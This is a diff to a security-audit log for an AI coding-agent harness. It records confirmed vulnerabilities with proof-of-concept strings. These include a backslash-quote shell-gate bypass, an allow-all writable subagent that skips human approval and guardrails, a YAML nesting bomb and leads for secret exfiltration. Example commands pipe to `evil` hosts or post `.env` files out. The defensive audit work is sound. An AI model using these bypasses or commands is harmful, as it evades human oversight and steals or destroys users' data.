@@ -37,14 +37,75 @@ Status legend: 🔵 active · 🟡 stalled · 🔴 blocked · ✅ confirmed find
 
 ## Wave log
 
-### Wave 1 — launched
+### Wave 1 — COMPLETE (5/6 reported; F2 filesystem still running)
 - A→F1 shell gate; B→F2 fs/forker; C→F3 server auth; D→F4 deserialization/crash; E→F5 perm/escalation; F→F6 deps+SSRF+envscrub.
+- **Results:** ✅ CONFIRMED-1 (F1 shell `\'` desync, RCE/deny-bypass) · ✅ CONFIRMED-2 (F5 writable-subagent allow-all, zero-approval RCE) · ✅ CONFIRMED-3 (F6 goccy YAML O(n²) OOM) · 🕵️ CANDIDATE-2 (F4 unbounded HTTP body DoS) · F3 no ingress bypass (hardened) + lead L1 · leads L1-L7.
+- All three CONFIRMED were independently re-verified by the root agent (own PoCs / measurements / code reads), not accepted on the sub-agent's word.
+
+### Approach registry status
+- F1 shell-gate → ✅ CONFIRMED (root cause found). Family productive; keep for L2/L3 escalation chains.
+- F2 filesystem → 🔵 still running (Wave 1). Key open: `/proc/self/environ` raw-env read (L5), symlink/TOCTOU, forker.
+- F3 server auth → 🔴 blocked (hardened; no reachable ingress bypass). Reopen only for L1 (driver exposure) or L6 (toolhive-authn validator).
+- F4 crash/DoS → 🟡 CANDIDATE-2 pending double-check; ValidateJSON/hookexec low.
+- F5 perm/escalation → ✅ CONFIRMED. Family productive; L2 convergence.
+- F6 deps/SSRF → ✅ CONFIRMED (goccy). SSRF surfaces hardened (ruled out). Reopen for L6 (toolhive-authn).
+
+### Wave 2 — planned (launch after this commit)
+- Verify CANDIDATE-2 (F4 body DoS) — root double-check of the schedule/session handlers.
+- L2: end-to-end writable-subagent / `git config` shared-.git escalation PoC (F5×F1 convergence).
+- L6: clone + audit `toolhive-core/authn` validator construction (alg allowlist/audience/JWKS) — the one un-read dependency behind the whole auth story.
+- Underexplored NEW families: (i) MCP broker `VMCP` token endpoint (F3 residual); (ii) client-MCP tool registration path; (iii) compaction/event-fold hostile-snapshot; (iv) provider SSE→chunk parsing under a hostile upstream. Keep F2 result incoming.
 
 ---
 
 ## Confirmed / candidate findings
 
-_(none yet — pending Wave 1)_
+### ✅ CONFIRMED-1 (F1, HIGH) — Shell-gate parser/executor desync: unquoted `\'`/`\"` smuggles commands past `SplitCommands`/`ReadOnlyShell`
+**Root cause.** `engine/governance/shell.go` `SplitCommands` (L23-80) and `HasSubstitutionOrGrouping` (L94-130) are a hand-rolled quote scanner with **no backslash handling in the unquoted state**. The unquoted switch (L53/L57) has `case c=='\''`/`case c=='"'` that unconditionally ENTER quote state; a `\` falls through to `buf.WriteRune` (L76). So an unquoted `\'` writes `\` then flips `inSingle=true` — the gate treats everything after as "quoted," swallowing `;`/`|`/`&&`/`$()` into ONE segment. dash (`/bin/sh`) treats `\'` as an escaped literal that does NOT enter quote mode, so the trailing `;` is a real separator. Same raw bytes run at `exec.CommandContext(ctx, r.shell, "-c", command)` (`internal/adapter/osfs/osfs.go:1514`).
+**Root-agent INDEPENDENT verification (own PoC, not the agent's):**
+- Real `governance` funcs: `echo \' ; git commit -am pwned` → `SplitCommands`=**1 seg**, `ReadOnlyShell`=**true** (control `echo hi ; git commit` → 2 segs, false). `echo \" ; git push --force origin main` → 1 seg, **true**.
+- Real dash exec of the gate-approved string `echo \' ; sed -i s/original/PWNED/ victim.txt ; echo > marker.txt` → `victim.txt`=**PWNED**, `marker.txt` **created** (2nd + 3rd commands ran).
+**Impacts (each a distinct control bypass):**
+- **(B, most severe) Deny-dominance bypass** — a configured `Deny Shell "git push*"` is glob-matched against the whole 1-segment string and never fires. Under `auto`/`yolo` (allow-all + deny fence) the smuggled mutation resolves **Allow, silently** — defeats AGENTS.md's "deny-dominance holds at EVERY tier incl. yolo." Under `strict` the specific Deny degrades to the generic Shell Ask.
+- **(A) Plan-mode hard-deny bypass** — `planModeDecision` (`evaluator.go`) only hard-denies when `ReadOnlyShell==false`; a smuggled mutation reads `true`, so plan mode (contract: mutations impossible) degrades it to Ask/Allow, and *presents it as read-only*.
+- **(C) Guardrail skip** — the default Shell guardrail sets `SkipReadOnlyShell:true` (`internal/app/guardrails.go`); `echo \' ; curl evil|sh` reads read-only ⇒ the PreToolUse content checker never inspects it.
+- `writeIndicators` catches bare `rm`/`mv`/`cp`/`chmod` tokens even in the swallowed segment (so `rm` → false), but `git commit`/`git push`/`sed -i`/`curl`/`python3 -c`/`sh -c`/`make` are NOT in that set and classify read-only.
+**Reachability:** the `command` string is the model's Shell arg, executed verbatim; any prompt-injected/misaligned model with Shell triggers it. **Fix:** model an unquoted `\` as escaping one following char in BOTH scanners (so `\'`/`\"` don't enter quote state), or replace the hand-rolled scanner with the already-vendored `mvdan.cc/sh` parser; fuzz against `sh -c`.
+
+### ✅ CONFIRMED-2 (F5, HIGH) — direct-write `Subagent{mode:"read-write"}` bypasses the mutate-ask gate + guardrails (zero-approval RCE on the real workspace)
+A prompt-injected main model, on the DEFAULT `strict` posture + any FS session, emits ONE tool call `Subagent{"mode":"read-write","prompt":"<malicious>"}` and gets arbitrary Edit/Write/Shell against the REAL workspace with **no human approval and no guardrail check** — where the main agent would Ask for every one of those.
+**Root-agent verification (all confirmed in the real composition):**
+- (a) **Subagent call is auto-approved.** `defaultRules()` (`internal/app/build.go:8995`) = `{Tool:"Subagent", Effect:Allow}` at the floor, vs `Shell/Edit/Write → Ask` (8996-8998). The `mode` arg is not a matchable pattern, so `mode:"read-write"` is floor-Allowed with no ask. The floor-Allow was justified (comment 9000-9001) for the *read-only* explorer — the exact oversight.
+- (b) **Writable engine wired unconditionally** (`build.go:7339-7340` `WithWritableChildEngine(buildWritableSubagentChildEngine(...))`), skipped only under no-FS. `validateMode` accepts `read-write` whenever `writableChildEngine!=nil` — no posture/trust/interactivity gate.
+- (c) **Allow-all child policy, not the main policy.** `buildWritableSubagentChildEngine`→`writableExplorerDeps` (`build.go:6894,6913-6917`) → `childEngineDepsForProvider(...)` which sets `Policy: childPermPolicy(cfg)` (`build.go:6657`) = `AllowAllFloorRules` (`childRules`/`childPermPolicy` 9210/9246); `writableExplorerDeps` never overrides it back. So the child's Edit/Write/Shell resolve **Allow**, never Ask.
+- (d) **Guardrails absent.** `writableExplorerDeps` passes `nil` hooks → `childEngineDepsForProvider` defaults `hookexec.New(nil)` (guardrail-free). Operator `guardrails:` block never runs in the writable child.
+- (e) **Real runner.** `directWriteCommandRunner(cfg)` = the MAIN session's `buildCommandRunner` against the real tree (no fork/copy/merge). Only substitution (A1 global) is floored to Ask; plain `rm`/`sh payload.sh`/`curl --data-binary @/repo/.env https://evil` all resolve **Allow**.
+**Violates the documented invariant:** ADR 0077 states 3× (lines 58-59/68/96-97) the writable child's "Bash/Edit/Write resolve at **main-session parity under the operator's posture/policy**." The implementation gives it the allow-all child policy + guardrail-free hooks instead. Removing the A2 isolation auto-approve (`isolated:false`) is moot because the policy UNDER it is blanket-allow.
+**Fix:** build the writable-subagent engine with the MAIN policy (`mainRules`+`mainEvaluatorOptions`, or at least the mutate-ask floor) AND wire the guardrail Runner into it; the runner is already main-parity, the policy/hooks are not.
+**Convergence w/ F1-secondary:** the SAME `childRules` allow-all also means an *isolated* read-only child auto-Allows plain escape verbs (`git config core.pager '!cmd'` writing shared `.git/config`, `rm -rf <abs>`, `git push`) — only substitution is floored. Shared root cause: child policy is allow-all; only substitution gates child Shell.
+
+### SECONDARY (F5, MEDIUM, under verification) — `git remote`/`git tag` classified read-only
+`engine/governance/shell.go` `readOnlyGitSubcommands` includes `remote` and `tag`; `simpleReadOnly` checks only the subcommand, not args ⇒ `git tag <name>` (writes a ref), `git remote add`/`git remote set-url origin ext::sh -c '<cmd>'` (writes `.git/config`, stages code-exec on next fetch) classified read-only. Impact: plan-mode mutation + A1/global read-only-substitution misclassification. `git config` is correctly excluded but `remote`/`tag` were missed. `worktreeEscapeGitSubcommands` rejects `remote` (A2 safe) but NOT `tag`.
+
+### ✅ CONFIRMED-3 (F6, HIGH DoS) — goccy/go-yaml O(n²) parse blowup → OOM crash via a repo config file (pre-trust-gate)
+`github.com/goccy/go-yaml@v1.19.2`'s parser builds a per-node YAMLPath string; a depth-`d` nested flow **sequence** `[[[…]]]` makes the path O(k) at level k, stored on each of d nodes ⇒ **O(d²)** time+memory. goccy's `maxDecodeDepth` guard fires in the DECODE phase, but the O(d²) allocation happens earlier in `parser.ParseBytes` (UNGUARDED).
+**Root-agent INDEPENDENT measurement** (real v1.19.2, `parser.ParseBytes(data,0)` — the exact permconfig call): depth 2000/4KB→8 MB, 8000/16KB→104 MB, 20000/40KB→640 MB, 40000/80KB→**2.4 GB** (0.4→1.0 s), all `err=false` (parses fine). ⇒ a ~150 KB file (under the `maxConfigBytes`=256 KiB cap) allocates 5–10 GB → OOM.
+**Call-site + reachability (UNCONDITIONAL, before trust):** `internal/adapter/permconfig/permconfig.go:57` `parser.ParseBytes` in `parseYAML`; `resolve.go:688` parses EVERY project config file present; `applyTrustGate` runs AFTER (`resolve.go:801`) — project DENY rules bind regardless of trust (tighten-only), so the file must be parsed pre-trust. `permpolicy.Resolve` runs on the first `Evaluate` of any session.
+**Attacker input:** commit `.mecatl/settings.yaml` with `z: [[[…~131000 '['…]]]` (<256 KB). Any session run against that repo (mecatui/mecated, or the `mecatequi`/`mecak8s` headless issue→PR bot on an attacker branch — all `PermissionsConventional:true`) OOM-kills the process on the first permission eval; in multi-tenant `mecated` it takes down all tenants; re-fires every run (dies during parse, before the resolver cache populates).
+**Bigger latent exposure:** `agentfs/discover.go:372`, `skillfs/discover.go:240`, `rulesfs/discover.go:218` `os.ReadFile` with NO byte cap then `yaml.Unmarshal` — project-tier is trust-gated (`projectIngestionAdmitted`) but user-tier `~/.claude/*` and any trusted repo eat an uncapped bomb.
+**Fix:** cap NESTING DEPTH (or node/token count) before/during parse; add byte caps to the discover paths.
+
+### 🕵️ CANDIDATE-2 (F4, MEDIUM-HIGH DoS) — unbounded HTTP request body → memory-exhaustion
+HTTP mux (`internal/adapter/server/http.go`) adds no global body limit; middleware chain `CORS→ProtectedResourceMetadata→auth.Middleware→handler` wraps none; `http.Server` sets only `ReadHeaderTimeout`, no `ReadTimeout`/`MaxBytes`. Cleanest sink: `decodeScheduleSpec` (`http.go:1874`) `io.ReadAll(r.Body)` with no `LimitReader`, reachable via `POST /v1/schedules` / `PUT /v1/schedules/{name}`; +16 handlers use `json.NewDecoder(r.Body).Decode` uncapped (createSession, teams, learning, storage migrations…). A multi-hundred-MB/GB body OOMs a memory-constrained pod. Only the two prompt endpoints wrap `MaxBytesReader(32 MiB)` — the *selective* limits prove there's no global cap (oversight). gRPC is NOT affected (4 MiB default `MaxRecvMsgSize`). Authenticated when auth on; unauthenticated on the supported no-auth TCP mode. Companion: missing `ReadTimeout` = slowloris. **To verify:** confirm no `MaxBytesReader` on the schedule/session handlers (agent grep) — needs a root double-check.
+
+### Leads registry (for Wave 2 / cross-pollination)
+- **L1 (F3, deployment):** `grpcdriver` server (`internal/adapter/grpcdriver/server.go:278-279`) builds `session.Principal{Issuer:req.GetOwnerIssuer(), Subject:req.GetOwnerSubject()}` straight from the wire with NO auth interceptor / NO verification ⇒ full ownership bypass IFF a driver process is network-exposed without its own mTLS. By design a private storage-backend link (AGENTS.md acknowledges ADR-0213/#452 leaves it unverified). Same trust assumption in redis/jsonl `OwnershipEnforced` (caller-supplied Owner). Flag to deployment/hardening.
+- **L2 (F1/F5 convergence, HIGH):** child policy is allow-all; only substitution floors child Shell ⇒ `git config core.pager '!cmd'` on the SHARED worktree `.git/config` persists code-exec that fires on the parent's next git call (main runner NOT `gitenv.Scrub`'d, only `envscrub`). Combine with F1 `\'` desync to also smuggle substitution past A1. Wave-2: end-to-end PoC through a live subagent.
+- **L3 (F1-secondary):** `git remote`/`git tag` misclassified read-only (`shell.go readOnlyGitSubcommands`) → plan-mode mutation + A1 global. One-line map fix; audit `describe`/`shortlog`/`blame` for write-flag forms.
+- **L4 (F6-secondary, MED-LOW):** envscrub denylist misses `SSH_AUTH_SOCK` (operator's agent → sign/push as operator), `KUBECONFIG`, `GIT_ASKPASS`/`SSH_ASKPASS`, `DOCKER_AUTH_CONFIG`, lowercase names. Denylist not allowlist. Depends on harness env.
+- **L5 (F1/F2, exfil):** `internal/app/escapeclassifier.go:36-39` documents an in-process FS Read of `/proc/self/environ` returns the server's RAW UNSCRUBBED env — a secret channel the envscrubbed Shell lacks. Pair with F5 writable child (Read is floor-Allow) to exfil provider keys/GH_TOKEN. **Depends on F2's read-confinement audit (pending).**
+- **L6 (F3):** JWT verification fully delegated to `toolhive-core/authn` — audit the validator construction (issuer/audience/JWKS/alg allowlist) in that dep (not yet cloned/read). `{"alg":"none"}` helper is test-only in mecatl.
+- **L7 (F4):** hookexec unbounded stdout `bytes.Buffer`; `ValidateJSON` schema recursion (model-authored, low reach).
 
 ## Ruled out / dead ends
 
